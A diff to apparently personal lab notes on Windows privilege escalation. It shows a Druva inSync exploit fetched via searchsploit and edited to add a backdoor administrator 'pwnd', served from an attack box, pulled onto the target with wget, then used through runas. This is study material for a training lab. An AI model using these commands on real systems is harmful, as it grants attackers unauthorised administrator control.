@@ -303,7 +303,8 @@ wmic product get name,version,vendor
 https://packetstorm.news/files/id/160404
 searchsploit Druva inSync 6.6.3
 searchsploit -m windows/local/49211.ps1
-2️⃣ # Change payload 
+2️⃣ # Change Exploit content
+nano 49211.ps1
 $cmd = "net user pwnd /add" --> $cmd = "net user pwnd Passw0rd /add & net localgroup administrators pwnd /add"
 3️⃣ # Transfer of malicious file to the victim system
 python3 -m http.server # attackbox
@@ -312,7 +313,9 @@ wget http://10.11.99.141:8000/49211.ps1 -O C:\Users\thm-unpriv\49211.ps1 # targe
 ./49211.ps1
 5️⃣ # Check Privilege pwnd user
 net user pwnd
-6️⃣ # As a last step, you can run a cmd or powershell as administrator (GUI)
+6️⃣ # As a last step, you can run cmd or powershell as administrator ( GUI OR CLI )
+runas /user:pwnd cmd.exe
+runas /user:pwnd powershell.exe 
 ```
 ## Credentials ✅
 ## File-Unattended ✅
